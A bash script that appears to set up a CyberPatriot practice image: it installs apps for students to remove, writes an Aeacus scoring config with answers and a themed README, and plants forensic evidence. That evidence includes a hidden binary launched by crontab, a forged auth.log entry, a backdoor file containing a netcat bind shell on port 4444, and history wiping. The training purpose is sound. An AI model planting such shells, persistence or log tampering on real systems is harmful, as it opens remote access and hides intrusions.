#!/bin/bash
# Aeacus Forensics Image Setup Script
# Sets up goose, crontab, log evidence, and Aeacus scoring

set -e

echo "[*] Starting Aeacus forensics image setup..."

# ============================================================
# 1. INSTALL VULNERABLE/UNNECESSARY APPS
# ============================================================
echo "[*] Installing apps for students to remove..."
sudo apt update
sudo apt install -y john wireshark nmap gedit gnome-calculator gnome-solitaire 2>/dev/null || true
echo "[+] Apps installed"

# ============================================================
# 2. SET UP DESKTOP GOOSE
# ============================================================
echo "[*] Setting up Desktop Goose..."
mkdir -p ~/.local/bin
cp ~/desktop-goose-linux-port/build/CppGoose ~/.local/bin/.goose
chmod 700 ~/.local/bin/.goose

# Add to crontab if not already there
(crontab -l 2>/dev/null | grep -q '.goose' || echo "@reboot ~/.local/bin/.goose start &" | crontab -) && echo "[+] Goose added to crontab"

# ============================================================
# 2. CREATE FORENSICS EVIDENCE
# ============================================================
echo "[*] Creating forensics evidence..."

# Add suspicious SSH log entry
echo "[+] Adding SSH attack log entry..."
echo "May  3 14:32:01 debian sshd[1234]: Failed password for root from 203.0.113.42 port 54321 ssh2" >> /var/log/auth.log

# Create backdoor script
echo "[+] Creating backdoor script..."
sudo bash -c "cat > /tmp/.sysupdate.sh << 'EOF'
#!/bin/bash
# Backdoor script
nc -l -p 4444 -e /bin/bash
EOF
chmod +x /tmp/.sysupdate.sh"

echo "[+] Forensics evidence created"

# ============================================================
# 3. CREATE AEACUS SCORING CONFIG
# ============================================================
echo "[*] Creating Aeacus scoring config..."
sudo mkdir -p /opt/Aeacus/images

sudo tee /opt/Aeacus/images/scoring.yaml > /dev/null << 'EOF'
title: "Debian 13 CyberPatriot Practice"
image_name: "debian13-practice"
point_total: 100

checks:
  # Goose removal (5 points)
  - id: "remove_goose"
    name: "Remove Desktop Goose"
    type: "command"
    command: "! pgrep -f '.goose'"
    points: 5

  # Disable SSH root login (10 points)
  - id: "ssh_root_disabled"
    name: "Disable SSH root login"
    type: "command"
    command: "grep -q '^PermitRootLogin no' /etc/ssh/sshd_config"
    points: 10

  # Update packages (10 points)
  - id: "packages_updated"
    name: "Update system packages"
    type: "command"
    command: "apt list --upgradable 2>/dev/null | wc -l | grep -q '^0$'"
    points: 10

  # Enable firewall (15 points)
  - id: "firewall_enabled"
    name: "Enable UFW firewall"
    type: "command"
    command: "ufw status | grep -q 'Status: active'"
    points: 15

  # Forensics: Rocky.jpg hidden message (15 points)
  - id: "forensics_rocky_message"
    name: "What is the secret message hidden in rocky.jpg?"
    type: "command"
    command: "steghide extract -sf ~/Desktop/rocky.jpg -p '' -of /tmp/rocky_msg.txt 2>/dev/null && grep -qi 'grace rocky save stars' /tmp/rocky_msg.txt"
    points: 15

  # Forensics: Attacker IP (10 points)
  - id: "forensics_attacker_ip"
    name: "What IP address attempted unauthorized SSH access?"
    type: "command"
    command: "grep 'Failed password' /var/log/auth.log 2>/dev/null | head -1 | grep -q '203.0.113.42'"
    points: 10

  # Forensics: Backdoor script (10 points)
  - id: "forensics_backdoor"
    name: "Find the name of the backdoor script left by the attacker"
    type: "command"
    command: "test -f /tmp/.sysupdate.sh && grep -q 'nc -l' /tmp/.sysupdate.sh"
    points: 10

  # Remove Jack the Ripper (5 points)
  - id: "remove_john"
    name: "Remove password cracking tool (John)"
    type: "command"
    command: "! dpkg -l | grep -q '^ii.*john'"
    points: 5

  # Remove Wireshark (5 points)
  - id: "remove_wireshark"
    name: "Remove network sniffer (Wireshark)"
    type: "command"
    command: "! dpkg -l | grep -q '^ii.*wireshark'"
    points: 5

  # Remove Nmap (5 points)
  - id: "remove_nmap"
    name: "Remove network scanner (Nmap)"
    type: "command"
    command: "! dpkg -l | grep -q '^ii.*nmap'"
    points: 5

  # Remove Gedit (3 points)
  - id: "remove_gedit"
    name: "Remove unnecessary text editor (Gedit)"
    type: "command"
    command: "! dpkg -l | grep -q '^ii.*gedit'"
    points: 3

  # Remove Gnome Calculator (3 points)
  - id: "remove_calculator"
    name: "Remove unnecessary app (Calculator)"
    type: "command"
    command: "! dpkg -l | grep -q '^ii.*gnome-calculator'"
    points: 3

  # Remove Gnome Solitaire (4 points)
  - id: "remove_solitaire"
    name: "Remove unnecessary game (Solitaire)"
    type: "command"
    command: "! dpkg -l | grep -q '^ii.*gnome-solitaire'"
    points: 4
EOF

echo "[+] Aeacus config created at /opt/Aeacus/images/scoring.yaml"

# ============================================================
# 5. CREATE README FOR STUDENTS
# ============================================================
echo "[*] Creating README..."
cat > ~/README.md << 'EOF'
# 🚀 PROJECT HAIL MARY: Earth Defense Initiative

```
CRITICAL MISSION BRIEFING
========================
Classification: TOP SECRET
Status: ACTIVE
Threat Level: CRITICAL
```

## MISSION OBJECTIVE

You have been selected for **PROJECT HAIL MARY** — humanity's last line of defense against a cyber-attack that threatens critical infrastructure. Your system has been compromised. You have one chance to harden it before the enemy strikes.

The fate of Earth depends on your ability to:
- 🔒 Eliminate unauthorized access vectors
- ⚔️ Remove weaponized tools left by attackers
- 🕵️ Uncover hidden malicious artifacts
- 🛡️ Fortify your defenses to repel all attacks

---

## 📋 MISSION PARAMETERS

**Total Mission Points:** 100

**Critical Objectives:**
1. **Eliminate the Anomaly** (5 pts) - Remove the chaos agent
2. **Secure Communications** (10 pts) - Prevent root intrusion
3. **Update Defensive Systems** (10 pts) - Patch all vulnerabilities
4. **Activate Shield Generators** (15 pts) - Enable firewall protection
5. **Recover Hidden Intelligence** (35 pts) - Extract forensic evidence
6. **Decontaminate System** (20 pts) - Remove offensive tools

---

## 🎯 HOW TO COMPLETE THE MISSION

1. **Access Mission Control:** `http://localhost:8080`
2. **Review Each Task** in the Aeacus dashboard
3. **Execute Remediation** on this system
4. **Verify Success** by re-running Aeacus scoring
5. **Track Progress** — You need 100/100 to save Earth

---

## ⚠️ INTEL REPORT

**Detected Threats:**
- ✗ Unauthorized process running (Desktop Goose)
- ✗ Root login permits remote access
- ✗ Unpatched system vulnerabilities
- ✗ Firewall disabled
- ✗ Hidden attacker artifacts
- ✗ Offensive security tools installed

**Your Task:** Neutralize all threats.

---

## 🔐 RESTRICTED ACCESS NOTES

Some artifacts have been deliberately hidden to test your investigative skills:
- A secret message encoded in an image file
- Evidence of an attacker's IP address in system logs
- A backdoor script concealed in the filesystem

**Forensics Challenge:** Find them all.

---

## ⏱️ MISSION TIME

There is no time limit. Take what you need to save the world.

Good luck, Commander.

```
Mission Control out.
```
EOF
echo "[+] README created at ~/README.md"

# ============================================================
# 6. CREATE AEACUS SYSTEMD SERVICE (AUTO-START ON BOOT)
# ============================================================
echo "[*] Setting up Aeacus auto-start service..."
sudo tee /etc/systemd/system/aeacus.service > /dev/null << 'EOF'
[Unit]
Description=Aeacus CyberPatriot Scoring Engine
After=network.target

[Service]
Type=simple
User=root
ExecStart=/opt/Aeacus/aeacus server --port 8080
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable aeacus.service
sudo systemctl start aeacus.service
echo "[+] Aeacus service enabled (port 8080)"

# ============================================================
# 7. CLEAR HISTORY (so students can't reverse engineer)
# ============================================================
echo "[*] Clearing command history..."
cat /dev/null > ~/.bash_history
cat /dev/null > ~/.zsh_history
cat /dev/null > ~/.history
history -c
history -w
sudo sh -c 'cat /dev/null > ~/.bash_history'
sudo sh -c 'history -c'
echo "[+] History cleared"

# ============================================================
# 8. TEST SCORING
# ============================================================
echo "[*] Testing Aeacus scoring..."
sudo /opt/Aeacus/aeacus score /opt/Aeacus/images/scoring.yaml

echo ""
echo "[+] Setup complete!"
echo ""
echo "Summary:"
echo "  - Desktop Goose hidden at ~/.local/bin/.goose"
echo "  - Crontab @reboot entry added"
echo "  - SSH attack log entry added"
echo "  - Backdoor script created at /tmp/.sysupdate.sh"
echo "  - Aeacus config ready at /opt/Aeacus/images/scoring.yaml"
echo "  - Aeacus service auto-starts on boot (port 8080)"
echo ""
echo "Total points: 100"
echo "  - Remove Goose: 5 pts"
echo "  - SSH hardening: 10 pts"
echo "  - Package updates: 10 pts"
echo "  - Firewall: 15 pts"
echo "  - Steghide forensics: 15 pts"
echo "  - IP forensics: 10 pts"
echo "  - Backdoor forensics: 10 pts"
echo "  - Remove John (password cracker): 5 pts"
echo "  - Remove Wireshark (sniffer): 5 pts"
echo "  - Remove Nmap (scanner): 5 pts"
echo "  - Remove Gedit: 3 pts"
echo "  - Remove Calculator: 3 pts"
echo "  - Remove Solitaire: 4 pts"
echo ""
echo "[*] Removing setup script..."
rm -f ~/setup_forensics.sh
echo "[+] Setup script deleted"
